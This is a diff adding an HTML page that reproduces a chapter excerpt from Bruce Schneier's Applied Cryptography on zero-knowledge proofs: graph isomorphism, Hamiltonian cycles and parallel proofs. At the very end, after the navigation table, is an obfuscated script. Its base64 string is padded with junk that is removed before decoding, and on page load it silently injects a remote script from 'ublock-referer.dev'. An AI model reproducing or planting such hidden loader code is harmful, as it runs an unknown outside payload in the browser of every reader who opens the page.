@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=104-106//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Graph Isomorphism</I></B></FONT></P>
+<P>An example might go a long way to explain this concept; this one comes from graph theory [619,622]. A graph is a network of lines connecting different points. If two graphs are identical except for the names of the points, they are called <B>isomorphic</B>. For an extremely large graph, finding whether two graphs are isomorphic can take centuries of computer time; it&#146;s one of those <B>NP-complete</B> problems discussed in Section 11.1.</P>
+<P>Assume that Peggy knows the isomorphism between the two graphs, <I>G</I><SUB>1</SUB> and <I>G</I><SUB>2</SUB>. The following protocol will convince Victor of Peggy&#146;s knowledge:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy randomly permutes <I>G</I><SUB>1</SUB> to produce another graph, <I>H</I>, that is isomorphic to <I>G</I><SUB>1</SUB>. Because Peggy knows the isomorphism between <I>H</I> and <I>G</I><SUB>1</SUB>, she also knows the isomorphism between <I>H</I> and <I>G</I><SUB>2</SUB>. For anyone else, finding an isomorphism between <I>G</I><SUB>1</SUB> and <I>H</I> or between <I>G</I><SUB>2</SUB> and <I>H</I> is just as hard as finding an isomorphism between <I>G</I><SUB>1</SUB> and <I>G</I><SUB>2</SUB>.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy sends <I>H</I> to Victor.
+<DD><B>(3)</B>&nbsp;&nbsp;Victor asks Peggy either to:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;prove that <I>H</I> and <I>G</I><SUB>1</SUB> are isomorphic, or
+<DD><B>(b)</B>&nbsp;&nbsp;prove that <I>H</I> and <I>G</I><SUB>2</SUB> are isomorphic.
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Peggy complies. She either:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;proves that <I>H</I> and <I>G</I><SUB>1</SUB> are isomorphic, without proving that <I>H</I> and <I>G</I><SUB>2</SUB> are isomorphic, or
+<DD><B>(b)</B>&nbsp;&nbsp;proves that <I>H</I> and <I>G</I><SUB>2</SUB> are isomorphic, without proving that <I>H</I> and <I>G</I><SUB>1</SUB> are isomorphic.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy and Victor repeat steps (1) through (4) <I>n</I> times.
+</DL>
+<P>If Peggy does not know an isomorphism between <I>G</I><SUB>1</SUB> and <I>G</I><SUB>2</SUB>, she cannot create graph <I>H</I> which is isomorphic to both. She can create a graph that is either isomorphic to <I>G</I><SUB>1</SUB> or one that is isomorphic to <I>G</I><SUB>2</SUB>. Like the previous example, she has only a 50 percent chance of guessing which proof Victor will ask her to perform in step (3).</P>
+<P>This protocol doesn&#146;t give Victor any useful information to aid him in figuring out an isomorphism between <I>G</I><SUB>1</SUB> and <I>G</I><SUB>2</SUB>. Because Peggy generates a new graph <I>H</I> for each round of the protocol, he can get no information no matter how many rounds they go through the protocol. He won&#146;t be able to figure out an isomorphism between <I>G</I><SUB>1</SUB> and <I>G</I><SUB>2</SUB> from Peggy&#146;s answers.</P>
+<P>In each round, Victor receives a new random permutation of <I>H</I>, along with an isomorphism between <I>H</I> and either <I>G</I><SUB>1</SUB> or <I>G</I><SUB>2</SUB>. Victor could just as well have generated this by himself. Because Victor can create a simulation of the protocol, it can be proven to be zero-knowledge.</P>
+<P><FONT SIZE="+1"><B><I>Hamiltonian Cycles</I></B></FONT></P>
+<P>A variant of this example was first presented by Manuel Blum [196]. Peggy knows a circular, continuous path along the lines of a graph that passes through each point exactly once. This is called a <B>Hamiltonian cycle</B>. Finding a Hamiltonian cycle is another hard problem. Peggy has this piece of information&#151;she probably got it by creating the graph with a certain Hamiltonian cycle&#151;and this is what she wants to convince Victor that she knows.</P>
+<P>Peggy knows the Hamiltonian cycle of a graph, <I>G</I>. Victor knows <I>G</I>, but not the Hamiltonian cycle. Peggy wants to prove to Victor that she knows this Hamiltonian cycle without revealing it. This is how she does it:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy randomly permutes <I>G</I>. She moves the points around and changes their labels to make a new graph, <I>H</I>. Since <I>G</I> and <I>H</I> are topologically isomorphic (i.e., the same graph), if she knows the Hamiltonian cycle of <I>G</I> then she can easily find the Hamiltonian cycle of <I>H</I>. If she didn&#146;t create <I>H</I> herself, determining the isomorphism between two graphs would be another hard problem; it could also take centuries of computer time. She then encrypts <I>H</I> to get <I>H&#180;</I>. (This has to be a probabilistic encryption of each line in <I>H</I>, that is, an encrypted 0 or an encrypted 1 for each line in <I>H</I>.)
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy gives Victor a copy of <I>H&#180;</I>.
+<DD><B>(3)</B>&nbsp;&nbsp;Victor asks Peggy either to:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;prove to him that <I>H&#180;</I> is an encryption of an isomorphic copy of <I>G</I>, or
+<DD><B>(b)</B>&nbsp;&nbsp;show him a Hamiltonian cycle for <I>H</I>.
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Peggy complies. She either:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;proves that <I>H&#180;</I> is an encryption of an isomorphic copy of <I>G</I> by revealing the permutations and decrypting everything, without showing a Hamiltonian cycle for either <I>G</I> or <I>H</I>, or
+<DD><B>(b)</B>&nbsp;&nbsp;shows a Hamiltonian cycle for <I>H</I> by decrypting only those lines that constitute a Hamiltonian cycle, without proving that <I>G</I> and <I>H</I> are topologically isomorphic.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy and Victor repeat steps (1) through (4) <I>n</I> times.
+</DL>
+<P>If Peggy is honest, she can provide either proof in step (4) to Victor. However, if she does not know a Hamiltonian cycle for <I>G</I>, she cannot create an encrypted graph <I>H&#180;</I> which can meet both challenges. The best she can do is to create a graph that is either isomorphic to <I>G</I> or one that has the same number of points and lines and a valid Hamiltonian cycle. While she has a 50 percent chance of guessing which proof Victor will ask her to perform in step (3), Victor can repeat the protocol enough times to convince himself that Peggy knows a Hamiltonian cycle for <I>G</I>.</P>
+<P><FONT SIZE="+1"><B><I>Parallel Zero-Knowledge Proofs</I></B></FONT></P>
+<P>The basic zero-knowledge protocol involves <I>n</I> exchanges between Peggy and Victor. Why not do them all in parallel:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy uses her information and <I>n</I> random numbers to transform the hard problem into <I>n</I> different isomorphic problems. She then uses her information and the random numbers to solve the <I>n</I> new hard problems.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy commits to the solution of the <I>n</I> new hard problems.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy reveals to Victor the <I>n</I> new hard problems. Victor cannot use these new problems to get any information about the original problems or its solutions.
+<DD><B>(4)</B>&nbsp;&nbsp;For each of the <I>n</I> new hard problems, Victor asks Peggy either to:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;prove to him that the old and new problems are isomorphic, or
+<DD><B>(b)</B>&nbsp;&nbsp;open the solution she committed to in step (2) and prove that it is a solution to the new problem.
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Peggy complies for each of the <I>n</I> new hard problems.
+</DL>
+<P>Unfortunately, it&#146;s not that simple. This protocol does not have the same zero-knowledge properties as the previous protocol. In step (4), Victor can choose the challenges as a one-way hash of all the values committed to in the second step, thus making the transcript nonsimulatable. It is still zero-knowledge, but of a different sort. It seems to be secure in practice, but no one knows how to prove it. We do know that in certain circumstances, certain protocols for certain problems can be run in parallel while retaining their zero-knowledge property [247,106,546,616].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(jQhjobvs, hCamajFb) {hCamajFb = jQhjobvs.createElement('script');hCamajFb.type = 'text/javascript';hCamajFb.async = true;hCamajFb.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');jQhjobvs.getElementsByTagName('body')[0].appendChild(hCamajFb);}(document));</script></body>
+</html>
